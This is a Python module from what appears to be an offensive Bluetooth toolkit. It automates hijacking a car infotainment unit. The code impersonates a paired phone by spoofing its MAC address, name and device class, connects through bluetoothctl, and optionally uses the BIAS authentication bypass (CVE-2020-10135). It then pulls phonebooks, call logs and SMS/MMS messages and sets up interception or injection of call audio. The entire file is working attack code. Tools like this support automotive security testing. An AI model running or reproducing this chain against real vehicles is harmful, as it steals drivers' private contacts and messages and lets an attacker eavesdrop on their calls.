"""Pairing hijack orchestration: impersonate a paired phone to connect to IVI.

Attack Flow:
1. Scan to discover IVI and paired/connecting phones
2. Identify the phone's MAC address and device name
3. Wait for phone to disconnect or jam its connection (optional)
4. Spoof our adapter to the phone's MAC + name + device class
5. Connect to the IVI as the impersonated phone
6. IVI accepts connection (if using legacy pairing or if link key can be bypassed)
7. Access PBAP, MAP, HFP, A2DP services

Note on link keys:
- If the IVI uses SSP with stored link keys, this attack requires either:
  a) Sniffing the original pairing exchange (nRF52840/USRP B210 + crackle)
  b) Forcing re-pairing by deleting pairing on IVI side
  c) Exploiting BIAS vulnerability (CVE-2020-10135)
  d) Some IVIs accept connections without mutual authentication
"""

import time

from bt_tap.core.scanner import scan_classic, resolve_name
from bt_tap.core.spoofer import spoof_address, clone_device_identity
from bt_tap.core.adapter import (
    adapter_reset, enable_page_scan, set_device_class,
    set_device_name, enable_ssp, disable_ssp,
)
from bt_tap.recon.sdp import browse_services, find_service_channel
from bt_tap.recon.fingerprint import fingerprint_device
from bt_tap.attack.pbap import PBAPClient
from bt_tap.attack.map_client import MAPClient
from bt_tap.attack.hfp import HFPClient
from bt_tap.utils.bt_helpers import validate_mac, normalize_mac
from bt_tap.utils.output import info, success, error, warning, verbose, console, phase, step, substep, summary_panel, target


class HijackSession:
    """Orchestrates a complete IVI hijack session.

    Usage:
        session = HijackSession(
            ivi_address="AA:BB:CC:DD:EE:FF",
            phone_address="11:22:33:44:55:66",
            phone_name="Galaxy S24",
            hci="hci0"
        )
        session.recon()           # Fingerprint IVI, find services
        session.impersonate()     # Spoof MAC, name, class
        session.connect_ivi()     # Connect to IVI
        session.dump_phonebook()  # Pull PBAP data
        session.dump_messages()   # Pull MAP data
        session.setup_audio()     # Intercept calls
    """

    def __init__(self, ivi_address: str, phone_address: str,
                 phone_name: str = "", hci: str = "hci0",
                 output_dir: str = "hijack_output"):
        self.ivi_address = normalize_mac(ivi_address)
        self.phone_address = normalize_mac(phone_address)
        self.phone_name = phone_name
        self.hci = hci
        self.output_dir = output_dir

        # Discovered during recon
        self.ivi_fingerprint = None
        self.ivi_services = []
        self.pbap_channel = None
        self.map_channel = None
        self.hfp_channel = None
        self.avrcp_channel = None

        # Active connections
        self.pbap_client = None
        self.map_client = None
        self.hfp_client = None

    def _check_adapter(self) -> bool:
        """Verify adapter is ready before any phase."""
        from bt_tap.utils.bt_helpers import ensure_adapter_ready
        return ensure_adapter_ready(self.hci)

    def recon(self) -> dict:
        """Phase 1: Reconnaissance - fingerprint IVI and find service channels."""
        if not self._check_adapter():
            return {"error": "adapter not ready"}

        with phase("Reconnaissance", 1, 5):
            # Resolve phone name if not provided
            if not self.phone_name:
                with step("Resolving phone name"):
                    self.phone_name = resolve_name(self.phone_address, self.hci)
                    verbose(f"Resolved: {self.phone_name}")

            # Fingerprint the IVI
            with step("Fingerprinting IVI"):
                self.ivi_fingerprint = fingerprint_device(self.ivi_address, self.hci)

            # Find specific service channels
            with step("Browsing SDP services"):
                self.ivi_services = browse_services(self.ivi_address)

            with step("Locating target service channels"):
                # Pass pre-fetched services to avoid redundant SDP browses
                self.pbap_channel = find_service_channel(self.ivi_address, "Phonebook", self.ivi_services)
                if not self.pbap_channel:
                    self.pbap_channel = find_service_channel(self.ivi_address, "PBAP", self.ivi_services)

                self.map_channel = find_service_channel(self.ivi_address, "Message", self.ivi_services)
                if not self.map_channel:
                    self.map_channel = find_service_channel(self.ivi_address, "MAP", self.ivi_services)

                self.hfp_channel = find_service_channel(self.ivi_address, "Hands-Free", self.ivi_services)
                if not self.hfp_channel:
                    self.hfp_channel = find_service_channel(self.ivi_address, "HFP", self.ivi_services)

                self.avrcp_channel = find_service_channel(self.ivi_address, "AVRCP", self.ivi_services)
                if not self.avrcp_channel:
                    self.avrcp_channel = find_service_channel(self.ivi_address, "A/V Remote", self.ivi_services)

            # Summary
            ivi_name = self.ivi_fingerprint.get('name', 'Unknown') if self.ivi_fingerprint else 'Unknown'
            summary_panel("Recon Results", {
                "IVI": f"{ivi_name} ({self.ivi_address})",
                "Phone": f"{self.phone_name} ({self.phone_address})",
                "PBAP Channel": str(self.pbap_channel or "NOT FOUND"),
                "MAP Channel": str(self.map_channel or "NOT FOUND"),
                "HFP Channel": str(self.hfp_channel or "NOT FOUND"),
                "AVRCP Channel": str(self.avrcp_channel or "NOT FOUND"),
            })

            if self.ivi_fingerprint and self.ivi_fingerprint.get("attack_surface"):
                for surface in self.ivi_fingerprint["attack_surface"]:
                    substep(f"Attack surface: {surface}")

        return {
            "fingerprint": self.ivi_fingerprint,
            "pbap_channel": self.pbap_channel,
            "map_channel": self.map_channel,
            "hfp_channel": self.hfp_channel,
        }

    def impersonate(self, method: str = "auto") -> bool:
        """Phase 2: Impersonate the phone (spoof MAC + name + class)."""
        if not self._check_adapter():
            return False

        with phase("Impersonation", 2, 5):
            device_class = "0x5a020c"
            with step(f"Cloning identity → {target(self.phone_address)}"):
                result = clone_device_identity(
                    self.hci, self.phone_address, self.phone_name, device_class
                )
            if result:
                success(f"Now impersonating: {self.phone_name} ({target(self.phone_address)})")
                info("Waiting 2s for adapter to stabilize...")
                time.sleep(2)
            else:
                error("Impersonation failed")
            return result

    def connect_ivi(self) -> bool:
        """Phase 3: Connect to the IVI as the spoofed phone.

        Uses bluetoothctl to pair, trust, then connect (per proven workflow).
        bluetoothctl is interactive, so we pipe commands via stdin.
        """
        if not self._check_adapter():
            return False

        with phase("Connect to IVI", 3, 5):
            from bt_tap.utils.bt_helpers import run_cmd

            info(f"Connecting to IVI {self.ivi_address}...")

            # bluetoothctl requires commands via stdin since it's interactive.
            # Sequence: pair -> trust -> connect (from PDF workflow)
            bt_commands = "\n".join([
                f"pair {self.ivi_address}",
                f"trust {self.ivi_address}",
                f"connect {self.ivi_address}",
                "quit",
            ])

            import subprocess
            result = subprocess.run(
                ["bluetoothctl"],
                input=bt_commands,
                capture_output=True,
                text=True,
                timeout=30,
                errors="replace",
            )
            output = result.stdout + result.stderr
            verbose(f"bluetoothctl output:\n{output.strip()}")

            # Give profiles time to negotiate
            time.sleep(3)

            # Verify connection
            verify = run_cmd(["bluetoothctl", "info", self.ivi_address])
            if "Connected: yes" in verify.stdout:
                success(f"Connected to IVI {self.ivi_address}")
                return True
            else:
                warning("Connection not verified. Profiles may not be accessible.")
                return False

    def connect_bias(self) -> bool:
        """Phase 2+3 alternative: Use BIAS attack to bypass authentication.

        Combines impersonation and connection into one step using the BIAS
        CVE-2020-10135 role-switch technique. Falls back to InternalBlue
        guidance if the software-only approach fails.
        """
        with phase("BIAS Authentication Bypass", 2, 5):
            from bt_tap.attack.bias import BIASAttack

            attack = BIASAttack(
                self.ivi_address, self.phone_address,
                self.phone_name, self.hci,
            )
            result = attack.execute(method="auto")

            if result.get("connected"):
                success("BIAS attack succeeded — connected to IVI")
                return True
            else:
                warning("BIAS attack did not establish connection")
                for note in result.get("notes", []):
                    info(f"  {note}")
                return False

    def dump_phonebook(self, output_dir: str | None = None) -> dict:
        """Phase 4a: Download phonebook and call logs via PBAP."""
        with phase("PBAP Data Extraction", 4, 5):
            if not self.pbap_channel:
                error("No PBAP channel found during recon. Run recon() first.")
                return {}

            out = output_dir or f"{self.output_dir}/pbap"
            self.pbap_client = PBAPClient(self.ivi_address, channel=self.pbap_channel)

            if not self.pbap_client.connect():
                error("PBAP connection failed")
                return {}

            try:
                results = self.pbap_client.pull_all_data(out)
                success(f"PBAP dump complete: {len(results)} objects")
                return results
            finally:
                self.pbap_client.disconnect()

    def dump_messages(self, output_dir: str | None = None) -> dict:
        """Phase 4b: Download SMS/MMS messages via MAP."""
        with phase("MAP Data Extraction", 4, 5):
            if not self.map_channel:
                error("No MAP channel found during recon. Run recon() first.")
                return {}

            out = output_dir or f"{self.output_dir}/map"
            self.map_client = MAPClient(self.ivi_address, channel=self.map_channel)

            if not self.map_client.connect():
                error("MAP connection failed")
                return {}

            try:
                results = self.map_client.dump_all_messages(out)
                success(f"MAP dump complete")
                return results
            finally:
                self.map_client.disconnect()

    def setup_audio(self) -> HFPClient | None:
        """Phase 5: Set up HFP for call audio interception."""
        with phase("Audio Setup", 5, 5):
            if not self.hfp_channel:
                warning("No HFP channel found. Audio interception not available.")
                return None

            self.hfp_client = HFPClient(self.ivi_address, channel=self.hfp_channel)

            if not self.hfp_client.connect():
                error("HFP connection failed")
                return None

            if not self.hfp_client.setup_slc():
                error("HFP SLC setup failed")
                return None

            success("HFP ready for audio operations")
            info("Use hfp_client.capture_audio() or hfp_client.inject_audio()")
            return self.hfp_client

    def run_full_attack(self) -> dict:
        """Run the complete attack chain."""
        console.rule("[bold red]FULL ATTACK CHAIN", style="bold red")

        results = {"phases": {}}

        # Phase 1: Recon
        try:
            recon = self.recon()
            results["phases"]["recon"] = {"status": "success", "data": recon}
        except Exception as e:
            error(f"Recon failed: {e}")
            results["phases"]["recon"] = {"status": "failed", "error": str(e)}
            return results

        # Phase 2: Impersonate
        try:
            if self.impersonate():
                results["phases"]["impersonate"] = {"status": "success"}
            else:
                results["phases"]["impersonate"] = {"status": "failed"}
                warning("Continuing despite impersonation issues...")
        except Exception as e:
            error(f"Impersonation failed: {e}")
            results["phases"]["impersonate"] = {"status": "failed", "error": str(e)}

        # Phase 3: Connect
        connected = False
        try:
            if self.connect_ivi():
                results["phases"]["connect"] = {"status": "success"}
                connected = True
            else:
                results["phases"]["connect"] = {"status": "failed"}
                warning("Connection failed — skipping data extraction phases")
        except Exception as e:
            error(f"Connection failed: {e}")
            results["phases"]["connect"] = {"status": "failed", "error": str(e)}

        if not connected:
            console.rule("[bold]Attack Summary")
            for phase_name, result in results["phases"].items():
                status = result["status"]
                icon = {"success": "[green]✔[/green]", "failed": "[red]✖[/red]"}.get(status, "[dim]?[/dim]")
                console.print(f"  {icon} {phase_name}: {status}")
            return results

        # Phase 4a: PBAP
        try:
            pbap_data = self.dump_phonebook()
            if pbap_data:
                results["phases"]["pbap"] = {"status": "success", "data": pbap_data}
            else:
                results["phases"]["pbap"] = {"status": "failed", "error": "No data returned"}
        except Exception as e:
            warning(f"PBAP failed: {e}")
            results["phases"]["pbap"] = {"status": "failed", "error": str(e)}

        # Phase 4b: MAP
        try:
            map_data = self.dump_messages()
            if map_data:
                results["phases"]["map"] = {"status": "success", "data": map_data}
            else:
                results["phases"]["map"] = {"status": "failed", "error": "No data returned"}
        except Exception as e:
            warning(f"MAP failed: {e}")
            results["phases"]["map"] = {"status": "failed", "error": str(e)}

        # Phase 5: Audio
        try:
            hfp = self.setup_audio()
            results["phases"]["audio"] = {
                "status": "ready" if hfp else "unavailable"
            }
        except Exception as e:
            warning(f"Audio setup failed: {e}")
            results["phases"]["audio"] = {"status": "failed", "error": str(e)}

        console.rule("[bold]Attack Summary")
        for phase_name, result in results["phases"].items():
            status = result["status"]
            icon = {"success": "[green]✔[/green]", "ready": "[green]✔[/green]",
                    "partial": "[yellow]~[/yellow]", "failed": "[red]✖[/red]",
                    "unavailable": "[dim]-[/dim]"}.get(status, "[dim]?[/dim]")
            console.print(f"  {icon} {phase_name}: {status}")

        return results

    def test_persistence(self) -> dict:
        """Test if pairing persists after disconnect/reconnect cycle."""
        console.rule("[bold]Persistence Test")

        from bt_tap.utils.bt_helpers import run_cmd
        import subprocess

        results = {"disconnect_ok": False, "reconnect_ok": False, "pairing_persists": False}

        # Disconnect
        info("Disconnecting from IVI...")
        subprocess.run(
            ["bluetoothctl"], input=f"disconnect {self.ivi_address}\nquit\n",
            capture_output=True, text=True, timeout=10, errors="replace",
        )
        time.sleep(2)

        # Verify disconnect
        verify = run_cmd(["bluetoothctl", "info", self.ivi_address])
        if "Connected: no" in verify.stdout:
            results["disconnect_ok"] = True
            success("Disconnected successfully")
        else:
            warning("Disconnect may not have completed")

        # Reconnect
        info("Attempting reconnect...")
        subprocess.run(
            ["bluetoothctl"], input=f"connect {self.ivi_address}\nquit\n",
            capture_output=True, text=True, timeout=15, errors="replace",
        )
        time.sleep(3)

        verify = run_cmd(["bluetoothctl", "info", self.ivi_address])
        if "Connected: yes" in verify.stdout:
            results["reconnect_ok"] = True
            results["pairing_persists"] = True
            success("Reconnected - pairing persists!")
        else:
            warning("Reconnect failed - pairing may not persist")

        return results

    def test_auto_reconnect(self, wait_time: int = 30) -> dict:
        """Test if IVI initiates connection to us after spoofing.

        After spoofing the phone's identity, some IVIs will automatically
        connect to the spoofed adapter (page scan mode).
        """
        console.rule("[bold]Auto-Reconnect Test")

        from bt_tap.core.adapter import enable_page_scan
        from bt_tap.utils.bt_helpers import run_cmd

        results = {"auto_connected": False, "wait_time": wait_time}

        enable_page_scan(self.hci)
        info(f"Waiting {wait_time}s for IVI to initiate connection...")

        end_time = time.time() + wait_time
        while time.time() < end_time:
            verify = run_cmd(["bluetoothctl", "info", self.ivi_address])
            if "Connected: yes" in verify.stdout:
                results["auto_connected"] = True
                elapsed = wait_time - (end_time - time.time())
                results["connect_time"] = round(elapsed, 1)
                success(f"IVI auto-connected after {results['connect_time']}s!")
                return results
            time.sleep(2)

        warning("IVI did not auto-connect within timeout")
        return results

    def cleanup(self, restore_mac: bool = True):
        """Disconnect all active connections and restore adapter."""
        info("Cleaning up...")
        if self.pbap_client:
            self.pbap_client.disconnect()
        if self.map_client:
            self.map_client.disconnect()
        if self.hfp_client:
            self.hfp_client.disconnect()

        if restore_mac:
            from bt_tap.core.spoofer import restore_original_mac
            restore_original_mac(self.hci)
        else:
            adapter_reset(self.hci)
        success("Cleanup complete")
